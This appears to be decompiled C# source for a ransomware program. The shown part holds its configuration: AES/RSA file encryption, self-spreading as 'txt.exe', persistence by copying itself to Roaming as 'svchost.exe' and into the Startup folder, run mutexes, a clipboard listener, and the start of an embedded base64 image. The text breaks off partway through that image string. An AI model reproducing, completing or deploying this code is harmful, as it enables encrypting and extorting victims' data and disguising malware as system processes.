using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "txt.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAUDBAgICAgICAgIBwcHCAgHBwcHBwcHBwcHBwcIBwcHBwcHChALBwgOCQcHDBUMDhERExMTBwsWGBYSGBASExIBBQUFCAcIDwkJDxQPDw8UFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFP/AABEIAeACgAMBIgACEQEDEQH/xAAdAAEAAAcBAQAAAAAAAAAAAAAAAgMEBQYHCAEJ/8QAQhAAAgEDAgMFBAYHCAIDAQAAAAIDAQQSBQYHESITITEyQghSYnIJFDM0QXMjUWOCkpOxFRYkU2FxkbNDg4GhwRj/xAAbAQEAAgMBAQAAAAAAAAAAAAAABAUCAwYHAf/EADIRAQACAQMCBAQFBAIDAAAAAAACAwQBBRITIgYRFDIVIzFCISQzNFJRYWJxFkFDcnP/2gAMAwEAAhEDEQA/AOMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGDyhNDHVIBOwJIZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARgeoToyAnRmE2uxA6lPUq5CmcV6kEsAGbYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAToySTowDryJVSpfvoSXUx01Yw1SydGSSOMyZJhPQlkyE12NE0fIkTlbgUs6GEGFc1EADelAAAAAAAAAAAAAAAAAAAAAAAAPT0mRpWvgVCWn6zHWemjdXROftUII5E5EBk0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARxkAAqoyFlPEJ2HOhg0qIjTxPXTvPDNuVSEZAgoadUZWopLcmw+BHP4Glo0+qyP4kBOn8SSTFgAAAAAAAAAAAAAAAAAAACMYMB7ShVW1pz8T21s5Gr0ozF5tNPvG8Ld2/wDg02WLHEoj96t0rRYaKzPIpadYkWlcVMr0nZ+pXVcfq8iqZ9tzgLNcdUqyqVGuXVVP5s17f+jwqi5/7F6/gPqz+6dfaZ7N8XLqYu//APNlty858nvlMVTLbofzcW0tJK+hibTS7j/Lb/g7asfZ1tUr5i/pwBs+XmU0WeI4R+1npt+Pp7puA5NPmXxRv+CnrG1PGh3drvs/W3LpYwPUvZ5SuWOZjX4pp+9l8KhL2TclnhvLdHBGe3+zilY15qux7yGrU7CT/gtqN2xrfbJCnttsWIAulzotxH5onUtzpVfGhPhZCX01RJ0Th9dEoAGTUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACYhUx+BSFTAxhPRrm8nQpivKV07xDUhNMhKqidxSwlanga5tNiWTCWTDBgo7opSquilN9aVD6PAAZswAAAAAAAAAAACfbxM9eSrkBK5lXa2UsvkRm/wBqGXbQ4f3d4684JManUXCTgFEirJL5vjKnL3Wmn+6xrwvuscvbZ4f3l01OdvLy/wCDbe3/AGf2lorNR1Ov9vbKtrOnckbf+sySOGOngi/wHO5G6ZN3t7EyF9NXtg5m237PcEeOTGyNI4QWkFP/ABsbU7OnuqR4EXq6+6bCe4Tkw/Sdq20Hoi/gMjtESnTRF/lkx0J0CEidcNYcooc8icvcdnT3VI//AIIwQe59SZE5/gQYE6Q8qYWdva+xQ4EHZ091ScCL03xRXdjE9O9F/gMS13h9b3Ppj/lmbYkwwnTGSRDInV7XOu/eEcWHQqnNW+uHTwu2KMfRG+slkpjU1nv7ZiPRmoqmnF3LJwbP8F7iZVOT8q187dS0uSGvepbanR/EnZKrl0mjNwaK0DN3Ho22btDLggbrsc6vm1exYQenhcOaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACfASCNPECtIHQmITnQjeaLz8lvpTlUuEHgUzIRwvyMplncnPUEEjktHMPJhwQXRRlZOUZvrSa3gAM2wAAAAAAABUQws/loTp9PlTxRjJOHdr2k6q3vnQtvwmTUKQt8BRbhvkMS3hN0OFs8MjH6vJzDp2g3M1eSRMxvHglwfe5kV7hGRUf1nQGxODMFtizYubc0bQobZMUVP5ZUZG9W5PZD8DWGPie3vmsu0NjW9jGvTH5PcM0iRV8KKowIyBwV075z9wARGpihBEAeaHAEwG1rQkJEDUzQkBGDTY+oARg+AAD702sKLUbNZKFwIBZiwm2aWcGmd/bMV6M2JzNxM2yyZc1O8762V6GkuLGz1dWZVKzHsswL/8HZbPuvU06VrgfVbXsmahQcjbG/doYM1aGsr60aKvfQ9Twc6GRD8HPbxtM8efPT2KEHp4TlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuNoxW1LfYlzqRbPqr7/copEJcicitkJMghqyhNROxHAQzU5Eds5uSFS8PcWyQvL+Bap6d5jXNhRJTgA3JIAAAAA9JkSZV5U/En2No8zUVFZjdnCjg7LeVjeVWQh5edXjw85JVGLO32qXgls+WaRWwY7f4e6P2MK819BaOGXDqLT418vkNjRw4nA5fLMu6sl1flwhT0KkzDl6SaQkRloqdUQANrWAAAAAPBQChrmzQAA0PoAABMJZMMzUABIawlkwASJCxbrsFmT9wvshS3/kIG6Q5Qb8WzhY5g4i7YXJuk0Tv3bPdkp1TxJfzdJozeb81bpI2xZ10JvUKdNMnG42ucbqPF6qSVqXPX6fpn+ctdT1ivXlHzeTZdfC6Uf7oQAZo4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn2r8i8weBY4/Eu0D9xouRch7MQKROHTlU0tCTfRFLD4lzr30LdIvKpsrm31zVb+BbJS4I3OhRT91TODZTokAA3NwAAIqFVZWjzOqqrNl+okwQ1evKnedCezzw1a7dZJU8j59ZCzs2GNDkl4uN1ZLh7P/Chrh1knRlw6+s7J2voMVpGq0RfJ7hHtfQ0tYlWir5PcL0cTZbO67namX5PZwqIyMRkwIQAAAAAAADwEANdk2zyACDMiTmIwScyONzDqPqMAG58ARnlDZA80QAJDWAACWQTpkrCQgzMrKOcGzRpLivb4dRoLdFyvUuR1VxQ0TtomZfcOM+JUUsM0nS3nKnasX53F6NtOdD03Jq3csP6Rq/EWStS+6pJl3Fikp3nqGJ7PxcHvMIdbnFLABvU4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAipUuVo5bKlTA5hZownHzXArY4edCijLhYJn0kKaumgjTkWy+jMmutHkSmWLGOX9WWvep8ot0n7WyGk+a3Z8iCQSEBYrAAAER5Q9KmwTKWOnvMfNWUNPNn3B/aDahcI1adKud+8Ltpx2ECqqr5DSfsobWWkTSMp1Fbx40VTz7c8ueRkeWn00Xl+scerpxT4yYeHppVYADaAAAAAAAAPKkBHUkyEWwQSOACC3oCOMgIwJyAkxk43QnyYBFQhjIqEqD5qiABIYAAD4kSJzIE7qlSQG2F/BipdTtlkRlr7hy17Q2z8FZ0U6sMU4g6Ct3Cy4r5Cpus4WdWC62vL6U+D5pyQVpNJStPWUWo6W1KZUobV4kbQe0upmojfbciyyIzx41T0HZ1bn5wjKLpYbHHJp4yatdORBUvuuWFVrliWKpfV284uFzsOeNbrCSEAGaGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjICMAQAAAAAAAAHqngAv2lJnQyLSocJY8vKYtos2LqZs6Ly50qVGX5xl5INkJ/azPWrmDsvTlgam3J11yopW6neP+LMWKS/atGNO3YXS/FKrunb7loABetgAAJtS77RgzuofnoWUy/hknO7h+cjZc+FMv9J23Q53Ri774EWCw2qY+4bRjNfcKPu0fyGwYEY872/v1msN1/VTiYSyYSlWAAAAAAAAAACWQSE4kyESxsQEZJzI4yE2KW/ILByO/Fga4N32KojICM3waE4EBMLVrS5HII3E5AniSfsYJ2YIH7i3X+sQQ+aVSrnfwbIV6zXHMZmBX+/4ErjmpW6bvCCfyyqQp5SV6C1mBA+LUZSit7xa+BHITcSELmicODW3EXh0l5RmXE0tqfDRo2bp6Trbx8VLfcaJFJ6VI2VjZGP8ApL7bvEE6e2Ti/dnDdsfKxpDdG3ntnbpY+kuu7SSVMcUNE8VOGK1Vmopv2nxBdjT4ZC0snjbpDj97izEgMq3lt9rWRqY1MWah6bj2wuhzi4bLxJ40+EkIAM0UAAAAAAAAAAAAAAAAAAAAAAAAAAAAARUPTyh6fGOqAAH1kAAAAAAAAmRtyqXnTdYZCxjkY2VxmLzrOr9tXpXEtcHiSiIQr4acYiff+JSkZAZAAAPTLeG33yD5zEjMeGCc723/ADaEXO/Rn/pY7X+4i+i/CxP8LF8hm8ZiXDpOVpF+TEZVAef4UPlcm/cZ/OTiYSyYb0EAAEsmEvM9zp7xuEYJeZMMAAAEuQgI5ARLGxTP4kaeAnTmMCunDizUt8LEnSpzEScjCtu59nkmSCNwDY0pwALCuxggehTPMq+LEjVr/sUyNH8SOLK21GVTTZZPXsgsMTAnkNjb93rDZxNi65YHKG+uKc80siqzquZj+9t/T3zt1Mpgc7865VYssHavutdZi7bDGgyC+3ZctXzsV+2+IlzaOtcmYwGeSlPUSfrKl78NpnDjwa78qDsTh1xoWbGOTE3ht/W0uUVqMp86dvX+Fcs8TozglvlaVxklOYztt9J3VK6zFhb7HUcbkyNyxabqSTKrI+RebcxrvUVmPwVVO+hh+97DtI+VFMwKV3y6aqRcva/UfjEx7+jPk4s41bS50ZscTnTWLBoXbmfQXi/oPaRM1FOOeKGisjt0Fz4bz516+nm6TcaIZ2P1fvarBMmTGvIlneOD10RDmKkaJzPj7GPJKAB9fAAAAAAAAAAAAAAAAAAAAAAAAER6eoHD4lgAPoAAAAAAAAAAI4yOQkgAAAAAAiqZtwt++2/5tDCamdcJIc763/NoRM/9CX+lhtv6r6O8OvukH5MRk6Fi2ZDytIfyYi+xnB4UPlM8qfzk8AGxGSyDMTuW/PvJMKOQnzu34EhMuZPjI48TPrdJs6aOAnEBGRepzAmHh6YviXIBIDVOD6EupMJP4lfeQAAYNgAQeoPipIJBVymnfuY3dQhBgvFXVVhhbqw6DiPfeotNPNzb1nS3tCXjPHjTI5G3bN2bt1Fns1Gk7dZO1wuGNic5LbeahiWi41KtSiler1Ltt/blzePjHEzHcaQhXHucrlbvdkT4xWhpqnnaVN16FwLnuFVmWRC4X3s/yorMuTGn4pjIPRuaE7Wv4VLxoWuy2zq1GYrdz7Nu7J65QSYmMuvKveSfKu6H9WGlltM3XfATiU0zLHIx1Tos2catT1HzC4f6u9rcpVfU8f8AU+hvB3WPrNpb8/cOE3bbfSZHnD6armd/qKeTYIkAI07+HtVnBa9W01Z0xqaJ4r8NFdWZVOhyk1O0WVca4lXOE4T6sFng50qZfi+Y+/duPZyt09OZhp2d7QHD1XRpEU5E16wrBKynoWxbnpk1eWvvad4wePzYezVbPxKmxflUpRQvVLCfGXJNn8SWRSEIJ+5CAA1gAAAAAAAAAAAAAAAAAAAACfAJxB4k6dDD7mv7lEADNsAAAAAAAAAAAAAAAAAABMNm8B4cr2L5zWFTdfs02edyrfGV27a8caSbg/qvoHt5OVtD8kRcIyl0zugh+QnxnG4tfGpjZ706Qgz7iCd/1EDv3GU+yDOtBO5ZdS1WKPxdS3733IlnG3UvkOXN98TXkkZUZvOQ68m66XGpfbbtPqO50bf78ij8HUkR8RYq+tTjm73m9fWxbP78SL62N3wrLn9y6nt2NT73ccG/Iq+tTJdK19ZfCp8/rPiHIjL1sbS2Dxc5VVWYi3bbnY/eg2YWPP2OzY35jM19s3fcFyi9Sme2zq9FajeY34uVy97n8rEnT7k+MjIIyMkzRQkyE4kyFReVoyAAwfQABmlyFvu37mLpgUV2ncarOcG6uTnzjrNyjb5Di3dV5WSeSnxnbHtD2f6FvkOHda+8Tc/fOn8Hd8ZyTd3yPkwgqtraW11MkdPfO7+A3C6Kzt455UVs0z6zk/2eLZZLvv8AQx9DdFxSwjVV/wDCWm863SlxgqKp8IMC39v+z0eir2UH8BbtkcV7PUmwqkC/uGgPashulfKnaY5mpuGF/dJdxYtJ9rEQaMDnT1eaw7efTd7b+4e2up2zPRI06Dgzi9s9tMuX93M+iWwZGfTI8/N9XOOva2Rc+7HzmzabJxu4NNkOycZNA6J9tH+ZGfQf2dPu0PyHAO14O0njX44z6KcC7DsrSFv2Jh4ns7oRZUQ/Ltj+ojIPURnOe5qR8iCQnDAz6HNr5tf8SdKpJC3T6DiPi/tvCWRlX1n0F3LZ9pHj8BzHxf23j2jcjHAvnh5Lq9r4ZeP0pOOJo8a8iWXzddt2c0nzljoeo1Wc4ebjcujo26wQgAzRQAAAAAAAAAAAAAAAAAAAAAAAE+Aqn8CijKz0mE2maikICZP4kszbgAAAAAAAAAAAAAAAAAARHRHsoQrWTKvvnPHI3p7MGo9lcKvP1lXvH7fVY7ZLytfQa0+yj+Qk3fTUj0l+cMfyEi/OWwfe02fVBn3ls3RrCWsLMzKnQXCB+5jQvtH7hePFVZus17xz5wqWmzYvqbuLWfGPf73MjKjGktWv+VWavrLhqU1WrJWrGFavcZVLzasCEIcXXbrlegp4QSrq9q1Sn7Vq/iQRrzqbJ4X8MZ9VfvVlL6yddMe5571bbptdpSSvlo1SbDPLHXLqodg6F7N8FF651RnT1uUu4PZsTlkkqv8AI5Ua73RrrxSa6J/zae4Wb7lt5FWrMdj8MN6rdxr39RxpvDh3PpEnqNh8A9wskmNWbznN7xiwn+YpddCuWRj8bXbkb92RGWvQ7jOGP5Cujcr675zg46cPLVOIPUBIa72CAEZAamwAAAkz95OkEZn7+0al41aP21s3yHz33Xb1iu51+M+pe7bFZoJl/ZSnzt47bbra3cr8uWbl54Yn0bp1N1/zaVm4Ubl/s+5Vvfc7/wCHu8LW8tLdayxK2B8yo3rSvd4mZbU39dWNV5SyYnS7lgTt7q1dXP8Ak784i7DtdYjVaOpgG0OBEFlO0rOvnz85qLa/tGSQ0VXVmLzqftLNVe6I574dkw7FnDKdP7h1220yzwzXohOBOOe7f7RuZVp4I5U8QuMFzqS40ZkNXc3mk95nYutu23oy5zabLoax4xZlwlsWlul5U9Z9DNg/o7O3X4Dln2cdpcmzdfOdUaT0qq0OM8QblC3L4LWvF4Y/Ffu2KyEs2ZcrXwNGJfzQ7IeS4xkZJg8ScTUCxC6c6Gp+L+jrJC3JTbT+BY9d03t42McqjlDnFN2nL9PdyfN3ito7Qzyd3rMAb9R1Jx/2nj2jYnMOow4SNQ7LY83rUpviLE4z60fvUYALty4AAAAAAAAAAAAAAAAAAAAAAACdGTHbkUwPnkx1h5o5H5ksA+sgAAAAAAAAAAAAAAAAAAemccKtXa2vbfH/ADaGDl42nJhd27fHQ05EOcNUrFnxm+onD6/7e1hb9jEXmfxNecB7/trReXoQ2JdpzOIwve3Z1fG1IkTkjHM3tHvzlU6Ww6GU5848aVV5Y2Iu5dmRGa/8Oe9zFuWHBWNbzeav+5uXiLYMi5GmpfNX/c63Zp86uTHxVPlbFkXD3SPrV3Cvxn0J4e7bg0rTu1wX7t2hw1wReOl5Dnj9r+J9AXhWbS8EbLO29BB3nWc58VNj19jmriZx0aG5wjXpR8DbPAPiWuroyupypxe2PeRXrMsUkmcxuX2T9qzwUkeXKL5yJfi0wx+cfelT9/Fm3tOWcXZK1EVeg5g4dav2V9j+2N8+1huREjjRWR+jA5Q2vct9cWv7b/8ATZi4vOifmscbO4cYPpFw9v8AtraP5DLYzV3A+bnbR9XoNjpN3nFU3xhrwV2XDvXAEnMEznzQuCMAGD6AAAAAJMnfRlOfvaR4drew9pGvV5zfs/cWXVo1mVldcjDS2dFnOCZRB8wdxaPLbTSIyNTFi0HYHG3h0j0aRFX9w5o1rbzwySUxY9D2reYZcGnK2uce6LEyPNi4SWZHHYFv1Iq7oTW1ErWvI2Nw02z2smbmKWltgym19iXndjRMCl3nLnCnsX2z7dzn3t+bBdI0VKKvQbQsO+imk9gu1HN4be76KeO5kPnOi3GvhBc7QvMFO4o4ELgngWm21zi5a+adAneVJTRvyI8zpIQV+o6Eu4bkrE8ptS8D7fZ2PlfvaJ43ab28bcjiffFh2NxJ859Ad722ascf8atFxdmU++HM7hkcHbZFHqcD/wCbSVQTJ0xryJZ6M891AAHwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARFZpL8po6/GUZU6b9rH8wn7Gyv3u+PZIv2ltW+Q37Ic6+x792k+Q6KOC/8AJNYZXvSXQwfiJt9bmmWPkM+KG/jyoxF3KHODZg2dGbkDipthqLJ0nLmrw1SV1r7x9CeIuiLJHJ0+g4x4tbca2mbkvrJHhLctOWtU17vNHqaerFg+iai1tNHIteWD5nVvCXj6qRLFKufRh1nIj9xHDM6eVmX/AGOyy8GGQ5Su/g+gs+/NKuqZvFbZfGYruvjZZ2UUkdukXk9BxbTV7qnhPJT98kz3kr+d2YqYeH4+f4ySvXw/izDiZvWTVZWarNjmWXZqc54/nLD4GUbDX9MvzltfXCnH1jFhiTlPI5Sdy8EZsYV+Q2tA/M0TwyvMI15e4bd0W85njvP583S52L97Kk8CMpYHyoVUZZwc7YjBBII3PrFOBJzGYEZBI/IjJM/eHyCiuLnmWu6mK24TkWm7NE1vjwgsWvWyTUxZTSHEnYyvRmVTfFwneUF9pqyU6lI1dk6Z84LuvhwcTattd42bpYgsdKby4MdUbg2CsvUqlBpvDdaVyqX3/J+zuaJ0aOfNN2k8lfIxsnZmz2Wvebd0zaSJXyKZHabcVadylJneILbuyCR2QYlt7R+yNobdXlQtNho/eZHY22FCjohOc+U0TOyIThxVpVJ4EhF5lUiHRYKgsToyciEmMnRl3XNDsTCROvOhGSLu4VKCyfYVsG3vbcqMc2cWLBXVuk6X3Zcq6mld92HNWOeqv4ZPN6Hsn6HCTjXXY8JXp/qW+le8yHe8OFxJ85jh7Fjy5V6avPNyhwvlF4ADcggAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACKhVad9tH81CloVmlJzmjp8Ys9jZX9Xdnse/dpPkOhjQvsmWDRWrN76G+sDgtZ96wzfeEmfwKkkToRb5sIMZ1+3V1Y524t7PWajNidM3cfcYHvPSu3oynO3WTxrucHSYN/ZwfPrdWitBIxYexb3TrDdnDTNsjEr7hivP3TusPxVj8NOapyNu5z7XPmFf1MRJC36qm7rzhisfqVi13+0sPSWMfEGPP2tENq1+5qdbaplmxbRu0Xl75dk2rlU2VsTZnepH3LeaY0rHE26HNsnh1C1FXmbd0HpoYftrTexopm2moeXws53c19lWdnFk+m+BckLbpidxcIy05uQv96XdJz8CgdKqXbuJE6LWg5vkJrZ23IjhduZJfxI4PE0Juui7+kgJyeAwUmwVqlnh5lvnsWL/gQ9mbLKJNsMjixKSz7yD6mZS9stfSQ/U1Nfp0v1zG/qXwj6j8Jk/1NSKO25GmeIw9esFrpXKuRcKWvd5S54DBTL0DRPLnNaY7bkTUhK50GB90xXzrpKQlTGnIioh7Um+TROYAQG+DSTvjQwvcGp86spVbr1jBPMa2vtYyZihzs51Gz7ZKfeu1/NWtDCd0JlG3yF/kvF5GO6tNzyK7Szvdng0cHKPE62wnkr8dTBv1G1eL1ni1WNVU8T2baLOeNHX+zzzxJTwy0AALRzoAAPSfHbO3gjVJcdO86D4QbYSRVZ0Rugr9y3GGHDnNYbdgTy58Iuf5oXTzKy/7kk6J4g8NM6ZRJ/Aad3rtl9PaNXy6/wBZhg7rTk+1sztqtxvcxcAFmqwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARr+Jd9opzu4PzKFop+JlnDW2zvrf82hpyZ8a5f6S8GHO3R9BeA1n2dovyGzIzD+F0OFrGv7GIzCM4LG74pmb+rJGQAgkI80atSzw9xj+pQr7pk8ha7u2yKrOrWOLPgxB7ZXy5qYLvOww6qKbZ7HEwzedstaHHafKuXVE+c2nY5ubY1UnXWjq688S7QaI1ZG6fWZho2j93Upd25fD2LGyhqnTdB6u9PWbJ23o6pTymR2+3l5+VTJLHTVpj0mFllmS0deFK2abZmU6bZ4k6101V6i7QQk3ExOCly87mhghxoVKICOpbwq4qSc0mQk+kqZCTgaJwZwWifxEHiXB4VH1YipvWT08COAgI4CVjoacCOoLWDX5g5kBGOD4cyAjA4CAEQPj75oQRg+8DzCAmEscGs5mP7k1hY1KrXb7s1NRbw1v4ikzsv7IL7adt9TM3RrGeXUYS9/yqzFr1bWPMYnd6w1a4kWjBnN6dg7bwhxi2Ml/n0iR/MY5t65Mjg6yLfXwm2dPg1Nxb03OPKimgL1MZGp/qdV8QrPnF5fQcz7ktcJWPR/CuXzp4uI8X4vOEbYrIADr3ngAAKuxr1Kdf8ABnTc4YTkDTvtF+Y7p4BQq1tD0nKeJ4coQ0dL4fs6PObZlhthKxrmqnMHt26OlpNpeCquaS+Q7IsLbuOR/pBk5XGk/kymW2UUwthwV+Xl3Xcubk4AHUqoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEw2PwQts72H5zXFDa3s/pldw/nFdu3bjyTcGXzX0M2nDhbQ8v8mIvUZbtC+wh/JiLocFhTZ3+9AQSE4gfwM7GNalkcgDoCu170padTLJdWeZkl/DzKWOw7ykvxOc1nRfwix+DQqVL1Z6LyLvaW2BVYE6jBgwv3Gclr+ocvdK2CFScynqIWNGIr52T1RohOPEJhKhQjz1ATAS2lLIJCMgkK3KbK0AICOM0NgRxkEhHGK/e+IyKhCRULGDDVEACQ1gAAAAAAAJchadZ1JYVK/U7iiJU05vrcDc2XIqtxy+HbBcbTtuuTNP3RuTzdRqPcut86t1Hmu63z9Rg2pXjPUhYmLKc+c3rG07TCBqepZV7iigfvyI7CwZ6k+6gwL3ThDsdF2Q7F90K5Mz0LvqYHt9GqxtXaFpzqc/uWnlr5KHcteC37z03nCcwcSLDB2Y7P3DpucWJzzxl0HFGYsfDWd0rtIauZzPzOJOLnipDQn3S4s1CRQ9W0eV2aeWrwAH1rVdh9ovzHd3s0plBD8hwfa+dfmO9PZef9DD8hzHiSHKEF1t0/kzdAQJjQ48+kT+8aP+VL/U7DjfI48+kT+8aP+VL/AFIe0wnHKjyV9jkUAHZooAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIza/AD73D85qc2TwTu+yvIfnK/c4csaSbgw5Wvo9t1/0MP5MRd/SYTpmpf4eHH/JiL7pOsK55ni38J8ZJ1+JP3LzGJBG68hITr5oUEkgIyAhN4R4CNOZORDX02HmgwI8CMiJ1dbXOaHAYEwErg1pEZPJZMNgAACWHAI84NimfxBG6ArunwZhHGQEcYr94jjIqEMZHQsYMNXoAJDWAADwAkvMtPUatbGemnmjpQgkfGhTT360oY1uDcCovSQrMuEUujEnbNSb61tVXGhoHeet97d5kO99z+bqNMa7ftK/mIWJRPInzm9Y8N7NwgmX1+z1Lht/S2nqW/TdKZ+o2Nsmzw8SZnZEaYeUF9uOVDGq7EFpoipTqMP3KnJjY2p3KpRjW25Js69xA26c5z5SVe1TnO3nNcNu+Jtzh73viaj20nLxN08K7bnIYZf6qLvlnCqbKdWsGwNIcY9K/QHUrWdKpTpNO8Z9HXsGFcOjdCbkdq3HnLpOBdcTGd6f6luMg3tBhczfOY/Q9iolyr01cRnQ43y0QgA3IidB51+Y7n9k+bJY1+A4YTxX/AHOzvZEuas6qUO++yKxwZdk3ViIcc/SLfeNH/Kl/qdkxnG/0i32+j/lS/wBSr2n9zFFn7XIgAOyaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARVMp4eX3Y3kFfjMVqVmlz9nNG3utSprvhzhrFKxbuE+T6RbGmW6s1ZW8sRR3F80LGGey5uP6zayKzegyzf36NlY8b3CjWmx3GDpzv4TZDpO5DKbTW1enpNHx6ov4FdBrzUr5iJDKnBIytghP2N5QOr+ojNZaHuxaeLGc6frSSFjC/m5nL226le4yMpUvFrTzKT86frLCvyVPT1RkwAntYAAAAAAADwgIxQ1zZoHKZ/EqXJLoRZwfa0EZOjJaJ3k80Q97KYTCRnyDzUp6iwrsafLVOBaZ9YRPdKW43ClPdMJ5lMG+GJdNkGRJe4VKd7GCajvWi/iYjrO9sqdLFfZusPsW+P4fyJ/VsnUtxxpTEwzVt38q+Y1zqe52b1GF6tuTv8SD87Idht3hiEfq2tqO9fiMN3BvbKnSxrm+16reot8bvNXHqJ1e3f9zdRi7FXX7lZruqtIzeYt+m2zSSKZPpW0nfqqxllht5IMWribLNwpphwglX7pTj9kFw0LRFWJWxLpaQrHWQnQXiUXHp6DCdybk78UOahC7Jm5Kmm7Jn+Kxbr1RnkZaFoe2auLVL9Y6bnXOvrJ2s2y0jXkdDXdCHZF09d0KeyKRoMPlN88K7bvNO7Xh7zfPDa27yDZPnc53xJZxpm2GnlU1nxmRfqzfIbMNX8an/AMM3yE7J9ujz/Z/3EXz94i/e5/nMTMs4i/e5/nMTPUcH9GH+tEHeP3MkIAJSrTY/FTsH2QX/AEynH0fip1x7IE36cod//RWm3fSTsSDwOOfpFvvGj/lS/wBTsWDvU46+kW+30b8mX+pVbL+rFFsciAA7NFAAAAAAAAAAAAAAAAAAAPVPABGQAAAAAAAAAAAAAPVPAB0D7Me6fqsnZtXzudRcRou2gjdW9GZwFsbVK211E1PfO0NsbsS+tMfV2WB574nxOFvP+rudmn1uEv4MAnvGjZlyH9t8huiDCRjEr9G5lHRjwuenY9EJsztNyd/cxk2m7wZKeY05Aj8/MX20hfllkxndgwgZeBS3PBvlveL5pu+e/vY0N2zp6mI49bZCF6Wf2KSex0z+x1To27UehfU1hKnK2i7tZK+ZjKbTe3+pn6nJpc9l+FO/sdFR3i190qUdTR+k7z+IyOx3mrG6G6/zUF/h+6DZozMOj3YnI9Tcy/Cb/iMFd8Ju/ozAGH/3pj+EjTdKGfxGB8Nu/oy/kORi/wDemP4SP+88fwj18GPw27+LI+ZB0mGX280X1KWK73ynvGie4wSaNlyJtmSXKr6i33esKhqqfe3xFl1beXd5iFPKn9q3o8Nz+5szUtzKuXUYhrO8G8qsa1v925eosb6qz1MeF0/q6XF8PQh7mxp9wvX1MW+fcje8YRPrHKhY7vWGcV4E5/Vd0bbpL7GYaluT4jHLrXmr6iitLN5/USdW0p4aZFhRiUw14rKuimHYl3epO3T1Fmndq17y86FYdoxM3JpvZ0Usa7IQnw0WEJwhPisVhbNNXE2htPbfZUVm6i17B0pWrk1DM/rKp0+4VG650569KDn943Gc/lQT9TuUhVekxLWdw+mhBvDUu4wm0uO1kY14GB5w5za9u26HDnNk223nupWXNiem3n7TqbIu2zLZYq5YmQYLz8pryM7hPygj5ebKm3hBb9Ws+zhj5GMyZSVxNja1DSsKmF4LSQjYV/KLVhWc4Mj2TYZupv3adh2casa94V6PzrzY23AmNFUsMKv8ebjvEmfyn0ophqLjhcr9WY2nfzckOfOOOqt2bG+6fOfBE2Gjlbzcab+fndTfOYyXfdT87qX56looeq4sONMP9KDcbOV8kIANyAmRnUXsiTf4o5cTxOlPZLm/xZS77+3W+1e53NYeRTjv6RT7fR/ypf6nYGmeRTj/AOkU+30f8qX+pSbL+4ih5DkYAHaogAAAAAAAAAAAAAEZARgQAAAAAAAAAAAAAAAAAAAAAJ0bY1pU2rwt3e8DdnVvOanK3SrmsbrX9RBz8SGTVrCS52bcZYlzqfUrxZ1VvgLQkPMx3aGu9snUxkcch5vZizxteD2rH186+cEu7s+VVMg29CslMSzTzc/Erdv3nZ1I9/Pgxyuc6l/fR+dGMc1LR2SpnVhqSVqq9JedS0pJlVkxKeGdOmfcqKM66mfe0zJpT06qZFvkmlSvmY3ZYaCtaNQsG5djNyzoWFG8VznxmsKN8p58JsI0nWHp+JerTcLU9RarfQ2ozKVOrbYlWmSsSLNMeU0qeuNrNfH3U3T1Fam5G5ec1rJZzpX1lL9fdenFjL4bCfsbvh1c/Y2b/eRufmD7kbl5jWH19/iPP7VY+/Cmz4To2U+5H99iR/e119bmvP7SYqoIXk8MjP4bCHva/htcPeymfdT19bFsn3C/vsYzeI6eJVaRZtNXuYkekphHk3+hphDmvn9qvX1MUF3fv8RnOk7Saq5EvUtpNSnlIGmdj6TV9e4Y8JsAgR5G8WM20LbzPQpdN0fCTH4zbu19KVUXpIu67lwh2NG67l2djWGrbbfl6jCLyzaN8anUU+kK9GXE1bvrbeLK1F9Zo27du7hNE23evtkpdi6bnQvW7NEWsflLhsWHCnlLtrsOSlZfnz9SgX5f5jm1NothhJIQbks86KZT2KqxHdwry8paaZevPmmeu+byWzbCdlRufuGLa9rdaSMq++X/AF28W